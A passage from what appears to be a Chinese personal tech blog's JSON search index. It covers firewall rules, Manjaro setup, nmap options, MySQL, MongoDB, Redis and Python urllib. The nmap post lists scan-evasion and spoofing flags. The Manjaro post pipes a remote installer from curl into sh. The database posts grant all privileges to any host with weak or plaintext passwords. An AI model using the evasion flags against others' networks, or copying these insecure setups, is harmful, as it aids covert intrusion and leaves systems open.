--reload\n\n\n富规则（复规则）\n精准匹配\nfirewall-cmd --permanent --zone=public --add-rich-rule=\"rule family\"=\"ipv4\" source address=\"192.168.10.0/24\" service name=\"ssh\" reject\"\n\nfirewall-cmd reload\n\n```\n\n\n3. **firewall-config  图形化**\n```\n\nfirewall-config\n\n\n```\n\n\n4. **TCP Wrappers**\n\n```\n（优先级：先匹配允许，再匹配拒绝）\n/etc/hosts.allow    #白名单\n                                允许服务名称、IP地址\n/etc/hosts.deny    #黑名单\n                                拒绝服务名称、IP地址\n\n白名单(编辑后就生效)\nsshd:192.168.10.0/24    #允许这个网段的主机访问\n\n\n黑名单(编辑后就生效)\nsshd:192.168.10.*        # 所有主机，通配符\n\n\n```\n\n\n\n1.2.3.    数据链路层（协议，端口号，来访IP地址）\n4.          应用层（服务名称）\n\n四个工具，只要有一个把他禁止，就禁止了！","tags":["rhel"],"categories":["Linux"]},{"title":"Manjaro 安装之后 基本配置","url":"%2Fposts%2F1319baa3%2F","content":"\n\n  \n# Manjaro 安装之后 基本配置\n\n\n\n**配置国内源**\n\n```bash\nsudo pacman-mirrors -i -c China -m rank   #弹出来框，我选择的清华的源\n\n\n```\n\n**升级系统**\n\n```bash\nsudo pacman -Syy && sudo pacam -Syyu\n```\n\n\n\n**安装vim**\n\n```bash\nsudo pacman -S vim\n```\n\n**添加arch源**\n\n```bash\nsudo vim /etc/pacman.conf\n#在文件末尾添加，我添加的清华的\n\n```\n\n**安装archlinuxcn签名钥匙**(导入 GPG key，否则的话key验证失败会导致无法安装软件)\n\n```bash\nsudo pacman -Syy && sudo pacman -S archlinuxcn-keyring\n```\n\n\n\n**安装网络工具包，ifconfig等**\n\n```bash\n\npacman -S net-tools dnsutils inetutils iproute2\n```\n\n\n\n---\n\n\n\n\n\n**安装sogou拼音输入法**\n\n```bash\nsudo pacman -S fcitx-im \t# 安装fcitx 选择全部安装\nsudo pacman -S fcitx-configtool \t# fcitx 配置界面\nsudo pacman -S fcitx-sogoupinyin \t# 安装sogoupinyin\n```\n\n**设置中文输入法环境变量**，编辑~/.xprofile文件，增加下面几行(如果文件不存在，则新建)    重启后生效\n\n```bash\nsudo vim ~/.xprofile # 打开编辑.xprofile文件\n# 在文件中加入以下两行代码\nexport GTK_IM_MODULE=fcitx\nexport QT_IM_MODULE=fcitx\nexport XMODIFIERS=\"@im=fcitx\"\n```\n\n\n\n**安装Google-Chrome浏览器**\n\n```\nsudo pacman -S google-chrome\n```\n\n**安装网易云音乐**\n\n```\nsudo pacman -S netease-cloud-music\n```\n\n**安装git (默认貌似就已经存在了)**\n\n```\nsudo pacman -S git\n```\n\n**安装wps，及其字体**\n\n```\n$ sudo pacman -S wps-office     # 安装wps\n$ sudo pacman -S ttf-wps-fonts  # 安装wps字体\n```\n\n**配置wps，使wps可以输入中文**\n\n```\n$ sudo vim /usr/bin/wps     # 编辑wps配置文件\n# 在 紧跟#!/bin/bash后添加下列三行\nexport GTK_IM_MODULE=fcitx\nexport QT_IM_MODULE=fcitx\nexport XMODIFIERS=\"@im=fcitx\"\n```\n\n注销后再次登录输入法生效。\n\n\n\n**安装Shadowsocks-qt5，实现科学上网**（我还是一会安ssr吧，在文章最底下）\n\n```\nsudo pacman -S shadowsocks-qt5\n```\n\n**安装VSCode**\n\n```\n sudo pacman -S visual-studio-code-bin  # 安装VSCode和云音乐等等，都需archlinuxcn源\n```\n\n**安装markdown编辑器**\n\n```\nsudo pacman -S typora\n```\n\n**配置jdk环境变量**\n\n```\n# 配置环境变量\n# sudo vim /etc/profile #编辑文件\n# 在文件末尾处追加下列几行\nexport JAVA_HOME=你的jdk解压后的绝对路径 \nexport JRE_HOME=${JAVA_HOME}/jre  \nexport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib  \nexport  PATH=${JAVA_HOME}/bin:$PATH\n```\n\n**安装终端显示信息neofetch(装b神器,安装screenfetch也可)**\n\n```\nsudo pacman -S neofetch\n```\n\n**安装Tim,微信 (KDE桌面无法使用)**\n\n```\nsudo pacman -S deepin.com.qq.office deepin.com.wechat\n```\n\n**配置微信，tim的中文输入问题 (KDE桌面无法使用)**\n\nTim启动脚本位置：/opt/deepinwine/apps/Deepin-TIM/run.sh WeChat启动脚本位置：/opt/deepinwine/apps/Deepin-WeChat/run.sh # 1 配置tim中文，打开tim启动脚本文件 （微信同理）\n\n```\nsudo vim /opt/deepinwine/apps/Deepin-TIM/run.sh\n```\n\n在启动脚本命令之前添加以下内容\n\n```\nexport GTK_IM_MODULE=fcitx\nexport QT_IM_MODULE=fcitx\nexport XMODIFIERS=\"@im=fcitx\"\n```\n\n**安装Deepin Terminal(终端)**，安装完成之后，自行在deepin-terminal更改显示字体\n\n```\nsudo pacman -S deepin-terminal\n```\n\n**安装有道词典**\n\n```\nsudo pacman -S youdao-dict\n```\n\n**安装vokoscreen录屏**\n\n```\n sudo pacman -S vokoscreen\n```\n\n**安装MariaDb代替mysql(MyriaDb与Mysql相互兼容)**\n\n```\n$ sudo pacman -S mariadb mariadb-clients\n# 安装成功后，根据提示，输入下列指令初始化MariaDb数据库\n$ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql\n# 一番信息自动输出完成后，执行以下代码\n$ sudo systemctl start mysqld # 启动MariaDb\n$ mysqladmin -u root password \"root\" # 为root、用户添加密码\n$ sudo systemctl enable mysqld # 设置mariaDb开机自启\n$ mysql -uroot -p # 输入设置的的密码，登录数据库\n```\n\n\n\n\n\n**安装配置oh my zsh**(听说是bash的升级版，装*专用，我就先不弄了)\n\n```\n$ sudo pacman -S zsh\n$ sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" # 下载并配置ohmyzsh\n$ chsh -s /bin/zsh  #更换默认bash，重启后生效\n```\n\n\n\n**卸载Manjaro自带的一些没用的软件**\n\n\n\n卸载之后就可以更新一下软件了\n\n```\nsudo pacman -Syyu\n```\n\n\n\n---\n\n## pacman基本命令\n\n\n\n**更新软件**\n\n```bash\n\nsudo pacman -Su\t\t# 更新已安装软件\n\nsudo pacman -Syu\t#更新软件前检查包列表是否最新\n\nsudo pacman -Syyu     #更新前强制下载包列表             \n```\n\n\n\n**查找软件**\n\n```\nsudo pacman -Ss packge_name\n```\n\n\n\n\n\n**安装指定的包**\n\n```\n pacman -S package_name1 package_name2 ...\n```\n\n\n\n**安装包组**\n\n一些包属于一个可以同时安装的**软件包组**，例如：\n\n```\n pacman -S gnome\n```\n\n\n\n想要查看哪些包属于 gnome 组，运行：\n\n```bash\npacman -Sg gnome\n```\n\n\n\n\n\n**删除软件包**\n\n1.删除单个软件包，**保留**其全部已经安装的依赖关系\n\n```bash\npacman -R package_name\n```\n\n2.除指定软件包，及其所有**没有被其他已安装软件包使用的依赖**关系：\n\n```bash\npacman -Rs package_name\n```\n\n3.要删除软件包和**所有依赖**这个软件包的程序\n\n```\npacman -Rns package_name\n```\n\n4.要删除软件包，但是**不删除依赖**这个软件包的其他程序：\n\n```bash\npacman -Rdd package_name\n```\n\n5.pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件：\n\n```bash\npacman -Rn package_name1\n```\n\n​\t\t**注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。**\n\n\n\n\n\n**清理软件包缓存**\n\npacman 将下载的软件包保存在 **/var/cache/pacman/pkg/** 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。\n\n使用内建选项即可清除未安装软件包的缓存：\n\n```bash\npacman -Sc\n```\n\n**警告**:仅在确定当前安装的软件包足够稳定且不需要降级时才执行清理。\n\n**pacman -Sc**仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文)中获取了。\n\n**pacman -Scc** 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。\n\n\n\n\n\n#### 更新源\n\n**自动：**\n自动设置最快的源\n\n```\nsudo pacman-mirrors -g\nsudo pacman -Syyu\n```\n\n\n\n**手动：**\n选择源：`sudo pacman-mirrors -i`\n同样要强制更新包\n\n重置为自动选择：\n\n```\nsudo pacman-mirrors -g -c all\n```\n\n切换testing分支\n\n```\nsudo pacman-mirrors -g -b testing\nsudo pacman -Syyu\n```\n\n退回稳定版\n\n```\nsudo pacman-mirrors -g -b stable\nsudo pacman -Syyuu\nsudo pacman-mirrors -i -c China -m rank\n```\n\n\n\n---\n\n### 清理垃圾\n\n清除系统中无用的包\n\n```\nsudo pacman -R $(pacman -Qdtq)\n```\n\n\n\n清除已下载的安装包\n\n```\nsudo pacman -Scc\n```\n\n\n\n\n日志垃圾\n查看日志文件\n\n```\ndu -t 100M /var\n```\n\n或\n\n```\njournalctl --disk-usage\n```\n\n\n\n\n删除指定大小日志文件\n\n```\nsudo journalctl --vacuum-size=50M\n```\n\n\n\n------\n\n### 安装ssr\n\n**步骤：**\n\n1. 安装git命令，用\n\n   ```\n   git clone -b manyuser https://github.com/shadowsocksrr/shadowsocksr.git\n   ```\n\n   下载shadowsockssr。\n\n2. 进入shadowshocksr目录  运行如下命令：\n   `./initcfg.sh`\n\n3. 运行如下命令编写user-config.json配置文件\n   `sudo nano user-config.json`                  将ssr服务器的配置填写到配置文件中\n\n4. 进入shadowsocks目录\n   `cd shadowsocks`\n   `./local.py   `            代理客户端已经开始运行\n\n5. 设置浏览器代理：\n   以firefox为例， 从 https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?src=search 添加foxyproxy-standard插件\n   左键点击插件图标 选 “options” – “add” –  “socks5”\n   填写代理的名称（随便写），IP（127.0.0.1），端口（1080）","tags":["Manjaro"],"categories":["Linux"]},{"title":"nmap参数简介","url":"%2Fposts%2Fc2379dd5%2F","content":"\n\n  \n### 新学一个抓包工具 ->   tcpump\n\n```\ntcpdmp -i eth0 -nn host 192.168.1.56 port 22 \n\n# 用nc连\nnc 192.168.1.56 -t 22\n\n# 点.  就是ack的意思\n\n```\n\n\n\n\n## 主机发现\n  \n```\n-iL  # 指定文件\n-iR 100 -p22 # 随机选择目标100个 的22端口 \nnmap 192.168.0.0/24 --exclude  192.168.0.1-100  # 不扫描后面的部分\n\n-sL  # 列出ip（相当于子网掩码的计算）\n-sN  # 只ping\n-Pn   #不做ping扫描，例如针对防火墙等安全产品， 防止：如果没有回包就不进行了    \n-PS/PA/PU/PY  # 用syn，ack，udp， sctp 发现\n-PE/PP/PM  #  用echo， 时间戳，子网掩码 （一般没啥结果）\n-PO   # ip协议的ping\n-n/ -R    # 不做dns解析  / 做反向的解析\n--dns-servers   # 调用指定的dns服务器\n--system-dns   # 操作系统默认的dns，一般不用\n--traceroute    # 过程中进行raceroute\n```\n\n## 端口发现\n\n```\n-sS/sT/sA/sW/sM   # 默认的  syn扫描/tcp扫描,建立完整连接(最准确)/发送ack / 窗口扫描 / ack+fn\n-sU   # udp扫描（准确性不怎么高）\n-sN/sF/sX    # tcp的flag全为空 /只有fin/ fin,psh,urg\n--scanflag   # 自定义flag   （自己得懂原理）\n-sI    # 僵尸扫描\n-sY/sZ   # sctp用  \n-sO   # ip扫描\n-b   # ip中继\n-\n-p   # 指定端口(tcp与udp都扫),  U: 53  -T:21   (分别指定tcp与udp的端口)   默认1000个\n--exclude-ports     # 指定端口中某一段\n-F   # 快速扫描(不会扫描100个全部端口)\n-r   # 连续扫描(顺序)\n--top-ports   # 扫排名前10个\n--port-radio   # 扫描更常见的端口(用处不大)\n```\n\n## 服务扫描\n\n```\n-sV       # 扫描这个端口跑的什么服务\n--version-intensity   # 0-9的扫描程度，9最详细\n--version-light     # 上面的等于2时\n--version-all       # 上面的等于9时\n--version-trace     # 将扫描过程进行跟踪\n```\n\n\n## 脚本扫描  （脚本目录:/usr/share/nmap/scripts/）\n\n```\n-sC      # 默认\n--script=...   # 指定脚本\n--script-args=    # 带参数\n--script-args-file=    \n--script-trace    # 也可以trace\n--script-updatedb    # 更新脚本  nmap --script-updatedb\n--script-help    # 查看脚本的帮助\n```\n\n\n## 操作系统类型\n\n```\n-O   # 操作系统类型\n--osscan-limit   # 限制检测的系统类型\n--osscan-guess\n```\n\n\n## 时间和性能\n\n```\n-T   # 指定间隔时间\n-min-hostgroup/ -max-hostgroup   # 最少一次扫描的主机数量 组\n--min-parallelism/ --max-parallelism  # 最少一次扫描的主机数量\n--min-rtt-timeout/ --max-rtt-timeout/ --initial-rtt-timeout   # 最小最大rtt\n\n--max-retries    #\n--host-timeout  # 超时时间\n--scan-delay/ --max-scan-delay 10s   # 延时时间(防止被发现)\n--min-rate    # 发包最小速率\n--max-rate\n```\n\n\n## 防火墙 和躲避\n\n```\n-f  # 最大传输mtu值    1500啥的\n-D 192.168.0.2  192.168.0.3  192.168.0.4  # 伪造原地址(迷惑)\n-S  # 伪造源地址\n-e  #  指定网卡\n-g  #  指定使用的源端口\n--proxies <url1, [url2]>  # 置地广代理服务器替我们发包 \n--data  # 数据字段指定内容(必须是16进制)\n--data-string\n--data-length\n--ip-options\n--ttl\n--spoof-mac   # 欺骗mac地址\n--badsum   # 发错的差错校验值\n```\n\n\n## 输出格式\n\n\n```\n-oN / -oX / -oS /-oG      # 正常格式/xml格式/../../\n\n```\n\n## 杂项\n\n```\n-6  # ipv6的\n-A  #  几个参数的组合（涵盖：-v, -O, --script, --trace）  # trace路由追踪\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["安全"],"categories":["渗透测试"]},{"title":"远程连接mysql","url":"%2Fposts%2Fdfb14e5b%2F","content":"\n\n\n\n  \n# 远程连接`MySQL`\n\n想要远程连接`MySQL` 那么必须是普通用户才行 不能是 `root` 用户 所以我们要先创建一个普通用户\n1. 创建普通用户\n    ```\n        CREATE USER 'username'@'%'  IDENTIFIED BY 'password';\n    ```\n2. 给普通用户赋权\n    ```\n        GRANT ALL ON *.* TO 'username'@'%'\n    ```\n3. 刷新系统权限相关表  \n    ```\n        FLUSH PRIVILEGES\n    ```\n以上三步执行的 创建用户 --> 给创建的用户赋权 --> 刷新 \n\n这样的话  可能还是不能完成`MySQL`的一个远程连接  这时候需要改变`MySQL`的一个默认配置 这配置文件位于`/etc/mysql/mysql.conf.d/`下的`mysqld.cnf` 里面有找到`bind-address` 把值`127.0.0.1`改为`0.0.0.0`然后接下来就是远程连接了  改完要记得重启`MySQL`服务\n\n接下来就是远程连接`MySQL`首先要保证自己电脑装了`MySQL`才能远程连接 \n```\n    mysql -u username -p password -h ip地址 -P 端口号（一般默认是3306） \n```\n如果想要远程连接 首先要保证 本地安装了`MySQL` 才能远程连接\n","tags":["mysql，数据库"],"categories":["数据库"]},{"title":"mysql创建新用户并分配权限","url":"%2Fposts%2F4dcc830c%2F","content":"\n  \n\n1、使用root用户登录mysql\n\n2、添加具有本地(localhost/127.0.0.1)访问权限的用户\n\n```\ncreate user 'newuser'@'localhost' identified by 'password';\n```\n\n3、创建具有远程访问权限的用户\n\n```\ncreate user 'newuser'@'%' identified by 'password';\n```\n\n创建之后记得执行下面指令更新权限：\n```\nflush privileges;\n```\n\n\n3、为新用户分配本地权限，可以指定数据库dbname和表名，可以用*替指所有。\n\n```\ngrant all privileges on `dbname`.* to 'newuser'@'localhost' identified by 'password';\n```\n\n\n4、为新用户分配远程权限，可以指定数据库dbname和表名，可以用*替指所有。\n```\ngrant all privileges on `dbname`.* to 'newuser'@'%' identified by 'password';\n```\n\n分配所有权限\n```\n> grant all privileges on *.* to  'test'@'%'  identified by '123456'\n```\n\n分配好之后之后记得执行下面指令更新权限：\n```\nflush privileges;\n```\n\n5、如果还有问题，可以使用root账号登陆上去查询一下，再看看有没问题。\n```\nuse mysql\n```\n\n6、查看user表\n```\nselect Host, User, Password from user;\n```\n\n\n","tags":["mysql"],"categories":["数据库"]},{"title":"mysql表结构复制","url":"%2Fposts%2Ff0858aa6%2F","content":"\n\n  \n﻿**复制结构：仿照student表结构复制一张new_student表,新表是空的：**\n\n```\ncreate table new_student like student;\n```\n**复制数据：但是没主键，结构不重要：**\n\n```\ncreate table new_student2 as\n(    \n\tselect * from student\n);\n```\n**复制表结构与数据，一模一样：**\n```\ninsert into new_student3 select * from student;\n```\n\n","tags":["mysql，数据库"],"categories":["数据库"]},{"title":"ubuntu彻底卸载mysql并且重新安装","url":"%2Fposts%2Fb0669918%2F","content":"\n  \n  \n首先删除mysql:\n\n```\nsudo apt-get remove mysql-*\n```\n\n然后清理残留的数据\n\n```\ndpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P\n```\n\n它会跳出一个对话框，你选择yes就好了\n然后安装mysql\n\n```\nsudo apt-get install mysql-client mysql-server\n```\n\n安装的时候会提示要设置root密码，如果你没有在卸载的时候去清理残留数据是不会提示你去设置root密码的\n检查mysql是不是在运行\n\n```\nsudo service mysql status\n```\n\n一般安装完成之后都是会自动运行的。\n如果没有运行你可以\n\n```\nsudo service mysql start\n```\n\n查看端口\n```\nsudo netstat -tap | grep mysql\n```\n运行它\n","tags":["ubuntu"],"categories":["数据库"]},{"title":"安装mysql竟然没让你输入密码","url":"%2Fposts%2F136d9777%2F","content":"\n  \nMysql5.7这个版本的root密码在/etc/mysql/debian.cnf这个文件里面 使用sudo cat /etc/mysql/debian.cnf命令打开，你大概会看到如下内容，其中就包括Mysql的默认登陆名与密码\n  \n```\n[client]\nhost     = localhost\nuser     = debian-sys-maint\npassword = M1WVft5X8S80rhE0\nsocket   = /var/run/mysqld/mysqld.sock\n[mysql_upgrade]\nhost     = localhost\nuser     = debian-sys-maint\npassword = M1WVft5X8S80rhE0\nsocket   = /var/run/mysqld/mysqld.sock\n\n```\n\n\n1、使用 mysql -u用户名 -p密码进行登陆，\n\n\n```\nmysql -udebian-sys-maint -pM1WVft5X8S80rhE0\n```\n\n\n2、修改root用户密码\n\n\n```\nshow databases；\nuse mysql;\nupdate user set authentication_string=PASSWORD(\"密码\") where user='root';\nupdate user set plugin=\"mysql_native_password\";\nflush privileges;\nquit;\n```\n\n\n注:由于mysql5.7没有password字段，密码存储在authentication_string字段中\n\n3、重新启动Mysql\n\n```\n/etc/init.d/mysql restart\n```\n\n\n\n4、再次使用root用户登陆\n\n\n```\n登陆成功\n```\n\n","tags":["mysql"],"categories":["数据库"]},{"title":"MongoDB简单的curd","url":"%2Fposts%2F589bc01a%2F","content":"\n  \n## ﻿集合创建：\n\n```\ndb.createCollection(\"test_col,\",{capped:true, size:10})\n\n# \"test_col\"  表名字(集合名字)\n# capped， 默认false，不设置上限，true设置上限\n\n```\n\n## 查看当前数据库的集合：\n  \n```\nshow collections\n```\n\n## 删除集合：\n  \n```\ndb.集合名称.drop()\n```\n\n\n\n### 查询：\n  \n```\n# 查找集合中所有的数据\ndb.collection_name.find() \t# 查询文档\n\n# pretty() 方法以格式化的方式来显示所有文档 美观\ndb.collection_name.find().pretty()\n\n# 指定_id查找\ndb.collection_name.find({_id:1}).pretty()\n```\n\n**_id：**\n\n> 如果插入数据不给定id，他会自动创建，可以通过id查找文档\n\n### 插入：\n\n```\n# 向集合插入文档\ndb.collection_name.insert(document)\n\n例子：db.col_test.insert({name:'xx', gender:'nan'})\n（在集合不创建的时候也可以，集合会自动被创建）\n\n```\n\n### 更新：\n\n```\ndb.collection_name.update({}) \t# 更新文档\n\ndb.collection_name.update({'count':88},{$set:{'count':89}})\n# count 由88变成89，只会作用于第一条数据\n\n例子：db.集合名称.update({name:'xx'}, {$set:{'name':'xps'}},  {multi:true})\n将name为xx的改为yy， multi多行，默认false，只作用于第一个，为true时修改多条\n\n# 更新多行，这个3.2的版本才支持\ndb.col_name.updateMany()\n```\n\n### 删除：\n\n```\ndb.collection_name.remove({}) \t# 删除集合所有文档 全部删除\n\ndb.集合名称.remove({gender:'nan', {justone:true}})  # 依据条件删除一条\njustone默认false，删除多条\n\n#删除多条3.2版本才有\ndb.col_name.deleteMany()\n\n# 删除集合\ndb.col_name.drop()\n```\n\n### **保存** （如果集合不存在，则执行添加操作）\n\n```\ndb.集合名称.save(document)\n```\n\n\n\n****\n\n### 数据类型\n\nobject ID  文档ID    （不会重复，12字节的16进制数）\n\nString 字符串\n\nBoolean  存储一个布尔值\n\nInteger 整数\n\nDouble 浮点值\n\nArrays 数组或列表\n\nObject 用于嵌入式的文档，即一个值为一个文档\n\nNull 存储NUll值\n\nTimes tamp 时间戳\n\nData 当前日期活时间的UNIX时间格式\n\nobject ID  ：\n\n（不会重复，12字节的16进制数，前4当前时间，...)\n","tags":["数据库"],"categories":["数据库"]},{"title":"redis基础","url":"%2Fposts%2F78b568c7%2F","content":"\n\n  \n在Ubuntu系统中**默认配置文件地址**:\n\n```\n/etc/redis/redis.conf\n```\n\n\n\n```\nport6379 \t# 默认端口    \nlogfile /var/log/redis.log \t# 日志文件位置    \ndbfilename dump.rdb \t\t# RDB持久化数据文件    \nbind 0.0.0.0\t# 指定IP进行监听    \n\n```\n\n\n  \n#### 组成部分：\n\n1. 服务端:   Redis-service\n\n2. 客户端:   Redis-cli\n\n3. ```\n   # 进入数据库\n   redis-cli\n   # 退出\n   exit\n   ```\n\n   \n\n## 基本数据类型：\n\n> - String:字符串\n> - Hash:哈希\n> - List:列表\n> - Set:集合\n> - Sorted set:有序集合\n\n\n\n```\n# 查看帮助\nhelp @sorted_set\n```\n\n\n\n### String:字符串\n\nstring是redis最基本的类型，一个key对应一个value。\n\n```\n# 设置值\nSET key value\n\n# 得到值\nGET key\n\n# 将key的值设置为新的，并返回旧的值\nGETSET key value_new\n\n# 设置多个键值\nMSET name xps sex nan\n\n#取出多个键的值\nMGET name sex\n\n# 获取key的值的长度\nSTRLEN name\n\n# 将该值追加到name的值xps的后面\nAPPEND name ppp\n\n# 设置持续时间\nSETEX name 10 xps\n\n# 如果该key有值就不执行\nSET name xxx\n\n# 每次执行将value的数字加1\nset age 10\nINCR age\n\n# 每次执行将value的数字减1\nDECR age\n```\n\n### 全局Key操作：\n\n```\nkeys *    # 查看所有的键\nDEL  key\nEXISTS  key\nRENAME old_key new_key\nTYPE key\n\n```\n\n\n\n### Hash:哈希（字段里面也有值）\n\nHashes类型看成具有String Key和String Value的map容器。\n\n```\n类似于这种结构：\nb = {\n  one:xps\n  two:xp\n  three:x\n}\n```\n\n\n\n```\n# 设置该key字段的值\nHSET key field value\nHSET b one xps\nHSET b one xps two xp three x\n\n# 获取该key字段的值\nHGET key field\nHGET b one\n\n# 获取hash表里面所有的值\nHVALS key\nHvals b\n\n# 获取hash表里面所有的字段\nHkeys b\n\n# 获取hash表中的字段数量\nHLEN b\n\n```\n\n### List类型（例如：微博评论）\n\nList类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表\n\n```\n# 向列表头部插入数据（顺序：c,b,a）\nLPUSH names a b c\n\n# 插入数据（x,y,z）\nRPUSh names2 x y z\n\n# 获取列表里面某个索引对应的值\nLINDEX key index\nLINDEX names 0\n\n# 弹出并删除最后一个元素\nRPOP names\n\n# 弹出并删除最前面一个元素\nLPOP names\n\n# 列表的长度\nLLEN key\n\n#\nLSET key index value\n\n```\n\n\n\n### Set类型(微博粉丝，关注人)\n\nSet类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。\n\n```\n# 向集合添加成员\nSADD setkey a b c d \n\n# 查看集合成员数量\nSCARD key\n\n#  迭代集合中的所有元素\nSMEMBERS key\nSMEMBERS setkey\n\n#  判断集合是否存在该元素(存在为1，不存在为0)\nSMEMBERS key value\nSMEMBERS setkey a\nSMEMBERS setkey z  \n\n#删除并返回集合中的一个随机元素 \nSPOP setkey\n\n```\n\n### Sorted Set类型（排行榜，top,直播）\n\n每一个成员都会有一个分数(score)(**权重**)与之关联。成员是唯一的，但是分数(score)却是可以重复的。\n\n```\n# 向有序集合添加成员，并且给他权重\nZADD key score1 member1 [score2 member2]\nZADD akey 1 a 2 b 3 c\n\n# 显示集合成员数\nZCARD zkey\n\n# 计算有序集合指定区的分数的成员数\nZCOUNT zkey 1 3\n\n# 移除有序集合一个或多个成员\nZREM zkey number\n\n# 查找 迭代有序集合所有元素\nZSCAN zkeys \n\n\n```\n\n\n\n### \n\n\n\n\n\n\n\n","tags":["redis"],"categories":["数据库"]},{"title":"redis常用命令","url":"%2Fposts%2Fc3982ec0%2F","content":"\n\n  \n﻿在Ubuntu系统中**默认配置文件地址**:\n\n```\n/etc/redis/redis.conf\n```\n  \n\n  \n```\nport6379 \t# 默认端口    \nlogfile /var/log/redis.log \t# 日志文件位置    \ndbfilename dump.rdb \t\t# RDB持久化数据文件    \nbind 0.0.0.0\t# 指定IP进行监听    \n\n```\n\n\n\n#### 组成部分：\n  \n1. 服务端:   Redis-service\n\n2. 客户端:   Redis-cli\n\n```\n# 进入数据库\nredis-cli\n# 退出\nexit\n```\n\n   \n  \n## 基本数据类型：\n  \n> - String:字符串\n> - Hash:哈希\n> - List:列表\n> - Set:集合\n> - Sorted set:有序集合\n\n\n\n```\n# 查看帮助\nhelp @sorted_set\n```\n\n\n\n### String:字符串\n\nstring是redis最基本的类型，一个key对应一个value。\n\n```\n# 设置值\nSET key value\n\n# 得到值\nGET key\n\n# 将key的值设置为新的，并返回旧的值\nGETSET key value_new\n\n# 设置多个键值\nMSET name xps sex nan\n\n#取出多个键的值\nMGET name sex\n\n# 获取key的值的长度\nSTRLEN name\n\n# 将该值追加到name的值xps的后面\nAPPEND name ppp\n\n# 设置持续时间\nSETEX name 10 xps\n\n# 如果该key有值就不执行\nSET name xxx\n\n# 每次执行将value的数字加1\nset age 10\nINCR age\n\n# 每次执行将value的数字减1\nDECR age\n```\n\n### 全局Key操作：\n\n```\nkeys *    # 查看所有的键\nDEL  key\nEXISTS  key\nRENAME old_key new_key\nTYPE key\n\n```\n\n\n\n### Hash:哈希（字段里面也有值）\n\nHashes类型看成具有String Key和String Value的map容器。\n\n```\n类似于这种结构：\nb = {\n  one:xps\n  two:xp\n  three:x\n}\n```\n\n\n\n```\n# 设置该key字段的值\nHSET key field value\nHSET b one xps\nHSET b one xps two xp three x\n\n# 获取该key字段的值\nHGET key field\nHGET b one\n\n# 获取hash表里面所有的值\nHVALS key\nHvals b\n\n# 获取hash表里面所有的字段\nHkeys b\n\n# 获取hash表中的字段数量\nHLEN b\n\n```\n\n### List类型（例如：微博评论）\n\nList类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表\n\n```\n# 向列表头部插入数据（顺序：c,b,a）\nLPUSH names a b c\n\n# 插入数据（x,y,z）\nRPUSh names2 x y z\n\n# 获取列表里面某个索引对应的值\nLINDEX key index\nLINDEX names 0\n\n# 弹出并删除最后一个元素\nRPOP names\n\n# 弹出并删除最前面一个元素\nLPOP names\n\n# 列表的长度\nLLEN key\n\n#\nLSET key index value\n\n```\n\n\n\n### Set类型(微博粉丝，关注人)\n\nSet类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。\n\n```\n# 向集合添加成员\nSADD setkey a b c d \n\n# 查看集合成员数量\nSCARD key\n\n#  迭代集合中的所有元素\nSMEMBERS key\nSMEMBERS setkey\n\n#  判断集合是否存在该元素(存在为1，不存在为0)\nSMEMBERS key value\nSMEMBERS setkey a\nSMEMBERS setkey z  \n\n#删除并返回集合中的一个随机元素 \nSPOP setkey\n\n```\n\n### Sorted Set类型（排行榜，top,直播）\n\n每一个成员都会有一个分数(score)(**权重**)与之关联。成员是唯一的，但是分数(score)却是可以重复的。\n\n```\n# 向有序集合添加成员，并且给他权重\nZADD key score1 member1 [score2 member2]\nZADD akey 1 a 2 b 3 c\n\n# 显示集合成员数\nZCARD zkey\n\n# 计算有序集合指定区的分数的成员数\nZCOUNT zkey 1 3\n\n# 移除有序集合一个或多个成员\nZREM zkey number\n\n# 查找 迭代有序集合所有元素\nZSCAN zkeys \n\n\n```\n\n\n\n### \n\n\n\n\n\n\n\n","tags":["redis"],"categories":["数据库"]},{"title":"urllib库的基本使用","url":"%2Fposts%2F8045626e%2F","content":"\n\n  \nurllib是Python自带的标准库，无需安装，直接可以用。\n\n- 提供了如下功能：\n- 网页请求\n- 响应获取\n- 代理和cookie设置\n- 异常处理\n- URL解析\n\n爬虫所需要的功能，基本上在urllib中都能找到，学习这个标准库，可以更加深入的理解后面更加便利的requests库。\n\n**urllib库**\n\n**urlopen 语法**\n\n```\nurllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None)\n#url:访问的网址\n#data:额外的数据，如header，form data\n```\n\n\n**用法**\n\n```\n# request:GET\nimport urllib.request\nresponse = urllib.request.urlopen('http://www.baidu.com')\nprint(response.read().decode('utf-8'))\n\n# request: POST\n# http测试：http://httpbin.org/\nimport urllib.parse\nimport urllib.request\ndata = bytes(urllib.parse.urlencode({'word':'hello'}),encoding='utf8')\nresponse = urllib.request.urlopen('http://httpbin.org/post',data=data)\nprint(response.read())\n\n# 超时设置\nimport urllib.request\nresponse = urllib.request.urlopen('http://httpbin.org/get',timeout=1)\nprint(response.read())\n\nimport socket\nimport urllib.request\nimport urllib.error\n\ntry:\n    response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1)\nexcept urllib.error.URLError as e:\n    if isinstance(e.reason,socket.timeout):\n        print('TIME OUT')\n```\n\n\n**响应**\n```\n# 响应类型\nimport urllib.open\nresponse = urllib.request.urlopen('https:///www.python.org')\nprint(type(response))\n# 状态码， 响应头\nimport urllib.request\nresponse = urllib.request.urlopen('https://www.python.org')\nprint(response.status)\nprint(response.getheaders())   # 获取响应头\nprint(response.getheader('Server')) # 